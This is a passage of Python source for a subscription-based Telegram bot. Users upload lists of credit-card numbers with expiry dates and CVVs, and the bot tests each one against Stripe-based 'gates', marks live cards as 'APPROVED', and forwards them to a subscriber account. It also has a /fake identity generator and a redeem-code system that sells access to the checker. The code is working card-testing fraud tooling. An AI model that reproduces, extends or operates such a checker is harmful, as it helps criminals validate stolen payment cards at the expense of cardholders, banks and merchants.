        result += f"🔴 <b>Error:</b> <code>{error_data.get('error', {}).get('message', 'Unknown Error')}</code>"

    return result

def send_country_codes_list(message,bot):
    country_list = "\n".join([f"{key} - {value}" for key, value in COUNTRY_MAP.items()])
    bot.reply_to(message, f"Available country codes:\n{country_list}")

def send_fake_details_gen(message,bot):
    try:
        command_parts = message.text.split()
        if len(command_parts) < 2:
            bot.reply_to(message, "Usage: /fake [country_code]\nExample: /fake usa\nUse /countrycode to see all code")
            return

        country = command_parts[1].lower()
        country_code = COUNTRY_MAP.get(country)

        if not country_code:
            bot.reply_to(message, f"Invalid country code. Use /countrycode to see available codes.")
            return

        try:
            fake = Faker(country_code)
        except AttributeError as e:  
            bot.reply_to(message, f"Error: Invalid country code: `{country}`. Please use /countrycode to see available codes.", parse_mode='Markdown')
            return


        try:
            zip_code = fake.postcode()
        except AttributeError:
            zip_code = "N/A"

        fake_phone = fake.phone_number()
        fake_phone = fake_phone.split('x')[0].strip()

        fake_email = generate_random_email(domain=random.choice(["gmail.com", "yahoo.com", "outlook.com", "hotmail.com"]))

        fake_data = (
    "📌 *Fake Address Details*\n\n"
    f"👤 *Name:* `{fake.name()}`\n"
    f"🏠 *Address:* `{fake.street_address().replace('\n', ', ')}`\n"
    f"🏙️ *City:* `{fake.city()}`\n"
    f"📍 *State:* `{getattr(fake, 'state', lambda: 'N/A')()}`\n"
    f"📦 *Zip Code:* `{zip_code}`\n"
    f"🌍 *Country:* `{fake.current_country()}`\n"
    f"📞 *Phone:* `{fake_phone}`\n"
    f"✉️ *Email:* `{fake_email}`\n"
    f"🏢 *Company:* `{fake.company()}`\n"
    f"💼 *Job:* `{fake.job()}`\n"
    f"🌐 *Website:* `{fake.url()}`\n"
    f"💳 *Credit Card:* `{fake.credit_card_full()}`"
)

        bot.reply_to(message, fake_data, parse_mode="Markdown")

    except Exception as e:
        bot.reply_to(message, f"Error: {e}")

def get_user_telegram_info(bot,message):
    user = message.from_user
    user_id = user.id
    first_name = user.first_name or "N/A"
    username = user.username or "No Username"
    is_premium = "Yes" if getattr(user, "is_premium", False) else "No"

    resp = f"""<b>🔍 Info of {user_id} on Telegram
━━━━━━━━━━━━━━
👤 First Name: {first_name}
🆔 ID: <code>{user_id}</code>
📛 Username: @{username}
🔗 Profile Link: <a href="tg://user?id={user_id}">Profile Link</a>
🌟 TG Premium: {is_premium}
</b>"""

    bot.send_message(message.chat.id, resp, parse_mode="HTML")


bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")
subscriber = SUBSCRIBER_ID
admin_ids = ADMIN_USER_IDS
allowed_users = load_allowed_users()
valid_redeem_codes = load_redeem_codes()
bot_users = load_bot_users()
registered_users = load_registered_users()

@bot.message_handler(commands=['register'])
def register_command(message):
    user_id = str(message.from_user.id)

    if user_id in admin_ids or user_id in subscriber:
        bot.reply_to(message, "You are already a privileged user and do not need to register for a bonus plan.")
        return

    if is_user_registered(user_id):
        bot.reply_to(message, "You are already registered.")
        return

    if register_user(user_id):
        expiry_time = datetime.now() + PLAN_DURATIONS["1hour"]
        expiry_timestamp = str(expiry_time.timestamp())
        set_user_plan(user_id, "1hour", expiry_timestamp)
        bot.reply_to(message, f"🎉 Registration successful! You have been granted a <b>1-hour</b> plan. Use /start to see your plan details and bot commands.", parse_mode="HTML")
    else:
        bot.reply_to(message, "Registration failed. Please try again.")

@bot.message_handler(func=lambda message: message.text.startswith("/start") or message.text.startswith(".start"))
def start(message):
    user_id = str(message.from_user.id)
    if not is_user_registered(user_id) and user_id not in admin_ids:
        bot.send_message(message.chat.id, "🚫 You need to register first to use the bot. Use /register to get started.")
        return

    if user_id not in allowed_users:
        bot.send_message(message.chat.id, "🚫 𝐘𝐨𝐮 𝐜𝐚𝐧𝐧𝐨𝐭 𝐮𝐬𝐞 𝐭𝐡𝐞 𝐛𝐨𝐭 𝐭𝐨 𝐜𝐨𝐧𝐭𝐚𝐜𝐭 𝐝𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫𝐬 𝐭𝐨 𝐩𝐮𝐫𝐜𝐡𝐚𝐬𝐞 𝐚 𝐛𝐨𝐭 𝐬𝐮𝐛𝐬𝐜𝐫𝐢𝐩𝐭𝐢𝐨𝐧 @GOKUOFFICIALREAL_BOT")
        return
    if user_id not in bot_users:
        bot_users.append(user_id)
        save_bot_users(bot_users)
    if user_id in subscriber:
        if not get_user_plan(user_id):
            set_user_plan(user_id, 'lifetime', None)
        plan_info = get_user_plan(user_id)
        plan_type = plan_info['plan_type']
        expiry_time_str = plan_info.get('expiry_time')
        if plan_type == "lifetime":
            expiry_message = "Lifetime Subscription"
        elif expiry_time_str:
            expiry_message = f"Expires: {datetime.fromtimestamp(float(expiry_time_str)).strftime('%Y-%m-%d %H:%M:%S')}"
        else:
            expiry_message = "No Expiry Info"
        bot.reply_to(message, f"🎉 𝐖𝐞𝐥𝐜𝐨𝐦𝐞! Your current plan: <b>{plan_type.upper()}</b>\n{expiry_message}.\n\n𝐒𝐞𝐧𝐝 𝐭𝐡𝐞 𝐭𝐱𝐭 𝐟𝐢𝐥𝐞 𝐧𝐨𝐰 𝐨𝐫 𝐮𝐬𝐞 /chk 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 𝐭𝐨 𝐜𝐡𝐞𝐜𝐤 𝐬𝐢𝐧𝐠𝐥𝐞 𝐜𝐚𝐫𝐝. Use /help to see available commands.", parse_mode="HTML")
        time.sleep(0.1)
    elif is_user_subscribed(user_id):
        plan_info = get_user_plan(user_id)
        plan_type = plan_info['plan_type']
        expiry_time_str = plan_info.get('expiry_time')
        if plan_type == "lifetime":
            expiry_message = "Lifetime Subscription"
        elif expiry_time_str:
            expiry_message = f"Expires: {datetime.fromtimestamp(float(expiry_time_str)).strftime('%Y-%m-%d %H:%M:%S')}"
        else:
            expiry_message = "No Expiry Info"
        bot.reply_to(message, f"🎉 𝐖𝐞𝐥𝐜𝐨𝐦𝐞! Your current plan: <b>{plan_type.upper()}</b>\n{expiry_message}.\n\n𝐒𝐞𝐧𝐝 𝐭𝐡𝐞 𝐭𝐱𝐭 𝐟𝐢𝐥𝐞 𝐧𝐨𝐰 𝐨𝐫 𝐮𝐬𝐞 /chk 𝐜𝐨𝐦𝐦𝐚𝐧𝐝 𝐭𝐨 𝐜𝐡𝐞𝐜𝐤 𝐬𝐢𝐧𝐠𝐥𝐞 𝐜𝐚𝐫𝐝. Use /help to see available commands.", parse_mode="HTML")
        time.sleep(0.1)
    elif not is_user_registered(user_id) and user_id not in admin_ids:
        bot.reply_to(message, "🚫 Your subscription is not active. Use /redeem <code>redeem_code</code> to activate a plan or /register to get started with a free trial.", parse_mode="HTML")
        time.sleep(0.1)
    else:
         bot.reply_to(message, "🚫 Your subscription is not active. Use /redeem <code>redeem_code</code> to activate a plan.", parse_mode="HTML")
         time.sleep(0.1)

@bot.message_handler(func=lambda message: message.text.startswith("/add") or message.text.startswith(".add"))
def add_user(message):
    user_id = str(message.from_user.id)
    if user_id not in admin_ids:
        bot.send_message(message.chat.id, "You do not have permission to add users.🚫")
        time.sleep(0.1)
        return
    try:
        new_user_id = message.text.split()[1]
        if new_user_id not in allowed_users:
            allowed_users.append(new_user_id)
            save_allowed_users(allowed_users)
            bot.reply_to(message, f"User ID {new_user_id} Has Been Added Successfully.✅\nCongratulations! Premium New User🎉✅ ")
            time.sleep(0.1)
        else:
            bot.reply_to(message, f"User ID {new_user_id} is already in the allowed users list.")
            time.sleep(0.1)
    except IndexError:
        bot.reply_to(message, "Please provide a valid user ID. Example: /add 123456789")
        time.sleep(0.1)

@bot.message_handler(func=lambda message: message.text.startswith("/delete") or message.text.startswith(".delete"))
def delete_user(message):
    user_id = str(message.from_user.id)
    if user_id not in admin_ids:
        bot.send_message(message.chat.id, "You do not have permission to delete users.🚫")
        time.sleep(0.1)
        return
    try:
        user_id_to_delete = message.text.split()[1]
        if user_id_to_delete in allowed_users and user_id_to_delete not in admin_ids:
            allowed_users.remove(user_id_to_delete)
            save_allowed_users(allowed_users)
            bot.reply_to(message, f"User ID {user_id_to_delete} has been removed successfully.✅")
            time.sleep(0.1)
        elif user_id_to_delete in admin_ids:
            bot.reply_to(message, "You cannot delete admin users.")
            time.sleep(0.1)
        else:
            bot.reply_to(message, "User ID not found in the list.🚫")
            time.sleep(0.1)
    except IndexError:
        bot.reply_to(message, "Please provide a valid user ID. Example: /delete 123456789")
        time.sleep(0.1)

@bot.message_handler(func=lambda message: message.text.startswith("/code") or message.text.startswith(".code"))
def generate_code(message):
    user_id = str(message.from_user.id)
    if user_id not in admin_ids:
        bot.send_message(message.chat.id, "You do not have permission to generate redeem codes.🚫")
        time.sleep(0.1)
        return
    try:
        command_parts = message.text.split()
        plan_duration_input = command_parts[1].lower()
        num_codes = 1
        if len(command_parts) > 2:
            try:
                num_codes = int(command_parts[2])
                if num_codes > 10:
                    num_codes = 10
            except ValueError:
                num_codes = 1

        if plan_duration_input not in PLAN_DURATIONS and not re.match(r'^\d+(minute|hour)s?$', plan_duration_input):
            available_plans = ", ".join(PLAN_DURATIONS.keys())
            bot.reply_to(message, f"Invalid plan duration. Available plans: {available_plans}, or custom duration like '30minutes', '2hours'.")
            time.sleep(0.1)
            return

        response_text = f"<b>🎉 New Redeem Codes 🎉</b>\n\n"
        generated_codes_list = []
        for _ in range(num_codes):
            redeem_code_value = generate_redeem_code()
            valid_redeem_codes[redeem_code_value] = plan_duration_input
            generated_codes_list.append(redeem_code_value)
            response_text += f"<code>{redeem_code_value}</code>\n"
        save_redeem_codes(valid_redeem_codes)
        response_text += f"\nUse these codes to redeem a <b>{plan_duration_input.upper()}</b> plan!"
        bot.reply_to(message, response_text, parse_mode="HTML")
        time.sleep(0.1)

    except IndexError:
        bot.reply_to(message, "Please specify a plan duration and optionally the number of codes. Example: /code 24hours 5 or /code lifetime")
        time.sleep(0.1)

@bot.message_handler(func=lambda message: message.text.startswith("/redeem") or message.text.startswith(".redeem"))
def redeem_code(message):
    user_id = message.from_user.id
    try:
        redeem_code_input = message.text.split()[1]
    except IndexError:
        bot.reply_to(message, "Please provide a valid redeem code. Example: /redeem GOKU-XXXX-XXXX-XXXX")
        time.sleep(0.1)
        return
    redeem_code_input = redeem_code_input.strip()
    redeem_codes_data = load_redeem_codes()
    if redeem_code_input in redeem_codes_data:
        plan_duration_str = redeem_codes_data[redeem_code_input]
        plan_duration = PLAN_DURATIONS.get(plan_duration_str)
        current_plan = get_user_plan(user_id)
        if current_plan and current_plan['plan_type'] == 'lifetime':
            bot.reply_to(message, "You already have a lifetime subscription. This code cannot be applied.")
            time.sleep(0.1)
            return
        if plan_duration:
            if current_plan and current_plan.get('expiry_time'):
                current_expiry_time = datetime.fromtimestamp(float(current_plan['expiry_time']))
                if current_expiry_time > datetime.now():
                    expiry_time = current_expiry_time + plan_duration
                else:
                    expiry_time = datetime.now() + plan_duration
            else:
                expiry_time = datetime.now() + plan_duration
            expiry_timestamp = str(expiry_time.timestamp())
            set_user_plan(user_id, plan_duration_str, expiry_timestamp)
        elif re.match(r'^\d+(minute|hour)s?$', plan_duration_str):
            duration_value = int(re.findall(r'\d+', plan_duration_str)[0])
            duration_unit = re.findall(r'(minute|hour)s?', plan_duration_str)[0]
            if duration_unit == 'minute':
                plan_duration = timedelta(minutes=duration_value)
                plan_duration_str = f"{duration_value}minutes"
            elif duration_unit == 'hour':
                plan_duration = timedelta(hours=duration_value)
                plan_duration_str = f"{duration_value}hours"
            if current_plan and current_plan.get('expiry_time'):
                current_expiry_time = datetime.fromtimestamp(float(current_plan['expiry_time']))
                if current_expiry_time > datetime.now():
                    expiry_time = current_expiry_time + plan_duration
                else:
                    expiry_time = datetime.now() + plan_duration
            else:
                expiry_time = datetime.now() + plan_duration
            expiry_timestamp = str(expiry_time.timestamp())
            set_user_plan(user_id, plan_duration_str, expiry_timestamp)
        elif plan_duration_str == 'lifetime':
             set_user_plan(user_id, 'lifetime', None)
        else:
            bot.reply_to(message, "Error processing redeem code duration.")
            time.sleep(0.1)
            return
        if str(user_id) not in allowed_users:
            allowed_users.append(str(user_id))
            save_allowed_users(allowed_users)
        del redeem_codes_data[redeem_code_input]
        save_redeem_codes(redeem_codes_data)
        plan_type_display = plan_duration_str.upper() if plan_duration_str != 'lifetime' else "LIFETIME"
        bot.reply_to(message, f"Redeem code <code>{redeem_code_input}</code> has been successfully redeemed.✅ You now have access to the bot with <b>{plan_type_display}</b> plan! Use /start to see your plan details.", parse_mode="HTML")
        time.sleep(0.1)
    else:
        bot.reply_to(message, "Invalid redeem code. Please check and try again.")
        time.sleep(0.1)

@bot.message_handler(func=lambda message: message.text.startswith("/gen") or message.text.startswith(".gen"))
def gen_command_handler(message):
    user_id = str(message.from_user.id)
    allowed_users = load_allowed_users()
    if str(user_id) not in allowed_users:
        bot.send_message(message.chat.id, "🚫 You do not have access to this bot.")
        return
    if not is_user_subscribed(user_id):
        bot.send_message(message.chat.id, "🚫 Your subscription has expired or you don't have an active plan. Use /redeem to activate a plan.")
        return
    bcall_gen(None, message)

@bot.message_handler(func=lambda message: message.text.startswith("/credits") or message.text.startswith(".credits"))
def credits_command_removed(message):
    bot.reply_to(message, "This command is no longer available. Please use /start to check your subscription plan.")
    time.sleep(0.1)

def process_check(message, cc_input):
    user_id = message.from_user.id
    session = manage_session_file()
    if not session:
        bot.reply_to(message, "❌ Failed to create or load session. Please try again.")
        time.sleep(0.1)
    ko_msg = bot.send_message(message.chat.id, "𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠 𝐂𝐚𝐫𝐝 𝐃𝐞𝐭𝐚𝐢𝐥𝐬... ⌛").message_id
    time.sleep(0.1)
    try:
        data = requests.get(f"{BINS_API_URL}{cc_input[:6]}").json()
    except:
        data = {}
    try:
        brand = data.get('brand', 'Unknown')
    except:
        brand = 'Unknown'
    try:
        card_type = data.get('type', 'Unknown')
    except:
        card_type = 'Unknown'
    try:
        country = data.get('country_name', 'Unknown')
        country_flag = data.get('country_flag', 'Unknown')
    except:
        country = 'Unknown'
        country_flag = 'Unknown'
    try:
        bank = data.get('bank', 'Unknown')
    except:
        bank = 'Unknown'
    start_time = time.time()
    user_gate = get_user_gate(user_id)
    try:
        if user_gate == "2$":
            last = str(Tele_stripe2(session, cc_input.strip()))
        elif user_gate == "4$":
            last = str(Tele_stripe4(session, cc_input.strip()))
        else:
            last = str(Tele(session, cc_input.strip()))
    except Exception as e:
        print(e)
        last = "Error"
    if 'Your card could not be set up for future usage.' in last:
        last = 'Your card could not be set up for future usage.'
    if 'Your card was declined.' in last:
        last = 'Your card was declined.'
    if 'success' in last:
        last = 'APPROVED ✅'
    if 'Card Expired' in last:
        last = 'Your Card Expired'
    if 'Live' in last:
        last = 'APPROVED ✅'
    if 'Unable to authenticate' in last:
        last = 'Declined - Call Issuer'
    elif 'Proxy error' in last:
        last = 'Proxy error '
    end_time = time.time()
    execution_time = end_time - start_time
    msg = f'''
<a href='https://envs.sh/smD.webp'>-</a> 𝐂𝐡𝐞𝐜𝐤𝐞𝐝 𝐂𝐚𝐫𝐝 💳
<a href='https://t.me/+bkxW-_IANZQ3YjY1'>┏━━━━━━━━━━━⍟</a>
<a href='https://t.me/+bkxW-_IANZQ3YjY1'>┃</a>𝐂𝐂 <code>{cc_input}</code><a href='https://t.me/+bkxW-_IANZQ3YjY1'>┗━━━━━━━⊛</a>
<a href='https://t.me/+bkxW-_IANZQ3YjY1'>-</a> 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: ⤿ 𝘚𝘛𝘙𝘐𝘗𝘌 ({user_gate.upper()}) 🟢 ⤾
<a href='https://t.me/+bkxW-_IANZQ3YjY1'>-</a> 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ⤿ {last} ⤾

<a href='https://t.me/+bkxW-_IANZQ3YjY1'>-</a> 𝐈𝐧𝐟𝐨: <code>{cc_input[:6]}-{card_type} - {brand}</code>
<a href='https://t.me/+bkxW-_IANZQ3YjY1'>-</a> 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {country_flag}</code>
<a href='https://t.me/+bkxW-_IANZQ3YjY1'>-</a> 𝐁𝐚𝐧𝐤: <code>{bank}</code>

<a href='https://t.me/+bkxW-_IANZQ3YjY1'>-</a> 𝐓𝐢𝐦𝐞: <code>{"{:.1f}".format(execution_time)} 𝐬𝐞𝐜𝐨𝐧𝐝</code>
<a href='https://t.me/+bkxW-_IANZQ3YjY1'>-</a> 𝐁𝐨𝐭 𝐀𝐛𝐨𝐮𝐭: <a href='https://t.me/+bkxW-_IANZQ3YjY1'>Goku </a>'''
    bot.edit_message_text(chat_id=message.chat.id, message_id=ko_msg, text=msg)
    time.sleep(0.1)

@bot.message_handler(func=lambda message: message.text.startswith("/chk") or message.text.startswith(".chk") or message.text.startswith("/check") or message.text.startswith(".check") or message.text.startswith("/bin") or message.text.startswith(".bin") or message.text.startswith("/戮") or message.text.startswith(".戮") or message.text.startswith("/validate") or message.text.startswith(".validate") or message.text.startswith("/验卡") or message.text.startswith(".验卡") or message.text.startswith("/cc") or message.text.startswith(".cc") or message.text.startswith("/card") or message.text.startswith(".card") or message.text.startswith("/info") or message.text.startswith(".info") or message.text.startswith("/栓卡") or message.text.startswith(".栓卡") or message.text.startswith("/查询") or message.text.startswith(".查询"))
def check_single_card_command(message):
    user_id = message.from_user.id
    allowed_users = load_allowed_users()
    if str(user_id) not in allowed_users:
        bot.send_message(message.chat.id, "🚫 𝐘𝐨𝐮 𝐜𝐚𝐧𝐧𝐨𝐭 𝐮𝐬𝐞 𝐭𝐡𝐞 𝐛𝐨𝐭 𝐭𝐨 𝐜𝐨𝐧𝐭𝐚𝐜𝐭 𝐝𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫𝐬 𝐭𝐨 𝐩𝐮𝐫𝐜𝐡𝐚𝐬𝐞 𝐚 𝐛𝐨𝐭 𝐬𝐮𝐛𝐬𝐜𝐫𝐢𝐩𝐭𝐢𝐨𝐧 @GOKUOFFICIALREAL_BOT")
        time.sleep(0.1)
        return
    if not is_user_subscribed(user_id) and str(user_id) not in admin_ids:
        bot.send_message(message.chat.id, "🚫 Your subscription has expired or you don't have an active plan. Use /redeem to activate a plan.")
        time.sleep(0.1)
    try:
        cc_input = message.text.split(maxsplit=1)[1].strip()
        if not re.match(r'\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}', cc_input):
            bot.reply_to(message, "❌ 𝐈𝐧𝐯𝐚𝐥𝐢𝐝 𝐂𝐂 𝐟𝐨𝐫𝐦𝐚𝐭. 𝐔𝐬𝐞: `/chk cc|mm|yy|cvv` or `.chk cc|mm|yy|cvv`")
            time.sleep(0.1)
        process_check(message, cc_input)
    except IndexError:
        bot.reply_to(message, "❌ 𝐏𝐥𝐞𝐚𝐬𝐞 𝐩𝐫𝐨𝐯𝐢𝐝𝐞 𝐂𝐂 𝐝𝐞𝐭𝐚𝐢𝐥𝐬 𝐚𝐟𝐭𝐞𝐫 the command. Use: `/chk cc|mm|yy|cvv` or `.chk cc|mm|yy|cvv`")
        time.sleep(0.1)
    except Exception as e:
        print(f"Error in single card check: {e}")
        bot.reply_to(message, "❌ 𝐀𝐧 𝐞𝐫𝐫𝐨𝐫 𝐨𝐜𝐜𝐮𝐫𝐞𝐝 𝐰𝐡𝐢𝐥𝐞 𝐜𝐡𝐞𝐜𝐤𝐢𝐧𝐠 𝐭𝐡𝐞 𝐜𝐚𝐫𝐝.")
        time.sleep(0.1)

@bot.message_handler(content_types=["document"])
def main(message):
    user_id = message.from_user.id
    allowed_users = load_allowed_users()
    if str(user_id) not in allowed_users:
        bot.send_message(message.chat.id, "🚫 𝐘𝐨𝐮 𝐜𝐚𝐧𝐧𝐨𝐭 𝐮𝐬𝐞 𝐭𝐡𝐞 𝐛𝐨𝐭 𝐭𝐨 𝐜𝐨𝐧𝐭𝐚𝐜𝐭 𝐝𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐫𝐬 𝐭𝐨 𝐩𝐮𝐫𝐜𝐡𝐚𝐬𝐞 𝐚 𝐛𝐨𝐭 𝐬𝐮𝐛𝐬𝐜𝐫𝐢𝐩𝐭𝐢𝐨𝐧 @GOKUOFFICIALREAL_BOT")
        time.sleep(0.1)
    if not is_user_subscribed(user_id) and str(user_id) not in admin_ids:
        bot.send_message(message.chat.id, "🚫 Your subscription has expired or you don't have an active plan. Use /redeem to activate a plan.")
        time.sleep(0.1)
    dd = 0
    live = 0
    incorrect = 0
    ko = bot.send_message(message.chat.id, "𝐏𝐫𝐨𝐜𝐞𝐬𝐬𝐢𝐧𝐠 𝐂𝐚𝐫𝐝 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠 ...⌛").message_id
    time.sleep(0.1)
    ee = bot.download_file(bot.get_file(message.document.file_id).file_path)
    with open("combo.txt", "wb") as w:
        w.write(ee)
    try:
        session = manage_session_file()
        if not session:
            bot.reply_to(message, "❌ Failed to create or load session. Please try again.")
            time.sleep(0.1)
        with open("combo.txt", 'r') as file:
            lino = file.readlines()
            total = 0
            for line in lino:
                extracted_ccs = extract_ccs_from_line(line)
                for cc in extracted_ccs:
                    total += 1
                    current_dir = os.getcwd()
                    for filename in os.listdir(current_dir):
                        if filename.endswith(".stop"):
                            bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='𝗦𝗧𝗢𝗣𝗣𝗘𝗗 ✅\n𝗕𝗢𝗧 𝗕𝗬 ➜ @GOKUOFFICIALREAL_BOT')
                            time.sleep(2)
                            try:
                                os.remove('stop.stop')
                            except FileNotFoundError:
                                pass
                            return
                    try:
                        data = requests.get(f"{BINS_API_URL}{cc[:6]}").json()
                    except:
                        pass
                    try:
                        brand = data['brand']
                    except:
                        brand = 'Unknown'
                    try:
                        card_type = data['type']
                    except:
                        card_type = 'Unknown'
                    try:
                        country = data['country_name']
                        country_flag = data['country_flag']
                    except:
                        country = 'Unknown'
                        country_flag = 'Unknown'
                    try:
                        bank = data['bank']
                    except:
                        bank = 'Unknown'
                    start_time = time.time()
                    user_gate = get_user_gate(user_id)
                    try:
                        if user_gate == "2$":
                            last = str(Tele_stripe2(session, cc.strip()))
                        elif user_gate == "4$":
                            last = str(Tele_stripe4(session, cc.strip()))
                        else:
                            last = str(Tele(session, cc.strip()))
                    except Exception as e:
                        print(e)
                        last = "Error"
                    if 'Your card could not be set up for future usage.' in last:
                        last = 'Your card could not be set up for future usage.'
                    if 'Your card was declined.' in last:
                        last = 'Your card was declined.'
                    if 'success' in last:
                        last = 'APPROVED ✅'
                    if 'Card Expired' in last:
                        last = 'Your Card Expired'
                    if 'Live' in last:
                        last = 'APPROVED ✅'
                    if 'Unable to authenticate' in last:
                        last = 'Declined - Call Issuer'
                    elif 'Proxy error' in last:
                        last = 'Proxy error '
                    mes = types.InlineKeyboardMarkup(row_width=1)
                    cm1 = types.InlineKeyboardButton(f"• {cc} •", callback_data='u8')
                    status = types.InlineKeyboardButton(f"• 𝐒𝐓𝐀𝐓𝐔𝐒  : {last} ", callback_data='u8')
                    cm3 = types.InlineKeyboardButton(f"• 𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃 ✅ : [ {live} ] •", callback_data='x')
                    cm4 = types.InlineKeyboardButton(f"• 𝐅𝐀𝐊𝐄 𝐂𝐀𝐑𝐃 ⚠️ : [ {incorrect} ] •", callback_data='x')
                    cm5 = types.InlineKeyboardButton(f"• 𝐃𝐄𝐂𝐋𝐈𝐍𝐄𝐃 ❌ : [ {dd} ] •", callback_data='x')
                    cm6 = types.InlineKeyboardButton(f"• 𝐓𝐎𝐓𝐀𝐋 🎉       :  [ {total} ] •", callback_data='x')
                    stop = types.InlineKeyboardButton(f"[ 𝐒𝐓𝐎𝐏 🚫 ]", callback_data='stop')
                    mes.add(cm1, status, cm3, cm4, cm5, cm6, stop)
                    end_time = time.time()
                    execution_time = end_time - start_time
                    bot.edit_message_text(chat_id=message.chat.id, message_id=ko, text='''𝐖𝐚𝐢𝐭 𝐟𝐨𝐫 𝐩𝐫𝐨𝐜𝐞𝐬𝐬𝐢𝐧𝐠
𝐁𝐲 ➜ <a href='https://t.me/+bkxW-_IANZQ3YjY1'>Goku </a> ''', reply_markup=mes)
                    time.sleep(2)
                    msg = f'''
<a href='https://envs.sh/smD.webp'>-</a> 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅
<a href='https://t.me/+bkxW-_IANZQ3YjY1'>┏━━━━━━━━━━━⍟</a>
<a href='https://t.me/+bkxW-_IANZQ3YjY1'>┃</a>𝐂𝐂 <code>{cc}</code><a href='t.me/addlist/u2A-7na8YtdhZWVl'>┗━━━━━━━⊛</a>
<a href='https://t.me/+bkxW-_IANZQ3YjY1'>-</a> 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: ⤿ 𝘚𝘛𝘙𝘐𝘗𝘌 ({user_gate.upper()}) 🟢 ⤾
<a href='https://t.me/+bkxW-_IANZQ3YjY1'>-</a> 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ⤿ Nice! New payment method added ✅ ⤾

<a href='https://t.me/+bkxW-_IANZQ3YjY1'>-</a> 𝐈𝐧𝐟𝐨: <code>{cc[:6]}-{card_type} - {brand}</code>
<a href='https://t.me/+bkxW-_IANZQ3YjY1'>-</a> 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {country_flag}</code>
<a href='https://t.me/+bkxW-_IANZQ3YjY1'>-</a> 𝐁𝐚𝐧𝐤: <code>{bank}</code>

<a href='https://t.me/+bkxW-_IANZQ3YjY1'>-</a> 𝐓𝐢𝐦𝐞: <code>{"{:.1f}".format(execution_time)} 𝐬𝐞𝐜𝐨𝐧𝐝</code>
<a href='https://t.me/+bkxW-_IANZQ3YjY1'>-</a> 𝐁𝐨𝐭 𝐀𝐛𝐨𝐮𝐭: <a href='https://t.me/+bkxW-_IANZQ3YjY1'>Goku </a>'''
                    print(last)
                    if 'success' in last or '𝗖𝗛𝗔𝗥𝗚𝗘𝗗💰' in last or 'APPROVED ✅' in last or 'APPROVED ✅' in last or "Your card's security code is invalid." in last:
                        live += 1
                        bot.reply_to(message, msg)
                        time.sleep(2)
                        bot.send_message(subscriber,msg)
                        time.sleep(2)
                    elif 'Card Not Activated' in last:
                        incorrect+=1
                    elif '𝟯𝗗 𝗟𝗜𝗩𝗘 💰' in last:
                        msg = f'''
<a href='https://envs.sh/smD.webp'>-</a> 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅
<a href='https://t.me/+bkxW-_IANZQ3YjY1'>┏━━━━━━━━━━━⍟</a>
<a href='https://t.me/+bkxW-_IANZQ3YjY1'>┃</a>𝐂𝐂 <code>{cc}</code><a href='t.me/addlist/u2A-7na8YtdhZWVl'>┗━━━━━━━⊛</a>
<a href='https://t.me/+bkxW-_IANZQ3YjY1'>-</a> 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: ⤿ 𝘚𝘛𝘙𝘐𝘗𝘌 ({user_gate.upper()}) 🟢 ⤾
<a href='https://t.me/+bkxW-_IANZQ3YjY1'>-</a> 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ⤿ 𝘕𝘪𝘤𝘦! 𝘕𝘦𝘸 𝘱𝘢𝘺𝘮𝘦𝘯𝘵 𝘮𝘦𝘵𝘩𝘰𝘥 𝘢𝘥𝘥𝘦𝘥 ✅ ⤾

<a href='https://t.me/+bkxW-_IANZQ3YjY1'>-</a> 𝐈𝐧𝐟𝐨: <code>{cc[:6]}-{card_type} - {brand}</code>
<a href='https://t.me/+bkxW-_IANZQ3YjY1'>-</a> 𝐂𝐨𝐮𝐧𝐭𝐫𝐲: <code>{country} - {country_flag}</code>
<a href='https://t.me/+bkxW-_IANZQ3YjY1'>-</a> 𝐁𝐚𝐧𝐤: <code>{bank}</code>

<a href='https://t.me/+bkxW-_IANZQ3YjY1'>-</a> 𝐓𝐢𝐦𝐞: <code>{"{:.1f}".format(execution_time)} 𝐬𝐞𝐜𝐨𝐧𝐝</code>
<a href='https://t.me/+bkxW-_IANZQ3YjY1'>-</a> 𝐁𝐨𝐭 𝐀𝐛𝐨𝐮𝐭: <a href='https://t.me/+bkxW-_IANZQ3YjY1'>Goku </a>'''
                        live += 1
                        bot.reply_to(message, msg)
                        time.sleep(2)
                        bot.send_message(subscriber,msg)
                        time.sleep(2)
                    elif 'Card Not Activated' in last:
                        incorrect+=1
                    elif '𝗖𝗖𝗡/𝗖𝗩𝗩' in last or 'Your card has insufficient funds.' in last or 'tree_d' in last:
                        msg = f'''
<a href='https://envs.sh/smD.webp'>-</a> 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅
<a href='https://t.me/+bkxW-_IANZQ3YjY1'>┏━━━━━━━━━━━⍟</a>
<a href='https://t.me/+bkxW-_IANZQ3YjY1'>┃</a>𝐂𝐂 <code>{cc}</code><a href='https://t.me/+bkxW-_IANZQ3YjY1'>┗━━━━━━━⊛</a>
<a href='https://t.me/+bkxW-_IANZQ3YjY1'>-</a> 𝐆𝐚𝐭𝐞𝐰𝐚𝐲: ⤿ 𝘚𝘛𝘙𝘐𝘗𝘌 ({user_gate.upper()}) 🟢 ⤾
<a href='https://t.me/+bkxW-_IANZQ3YjY1'>-</a> 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞: ⤿ 𝘕𝘪𝘤𝘦! 𝘕𝘦𝘸 𝘱𝘢𝘺𝘮𝘦𝘯𝘵 𝘮𝘦𝘵𝘩𝘰𝘥 𝘢𝘥𝘥𝘦𝘥 ✅ ⤾

<a href='https://t.me/+bkxW-_IANZQ3YjY1'>-</a> 𝐈𝐧𝐟𝐨: <code>{cc[:6]}-{card_type} - {brand}</code>
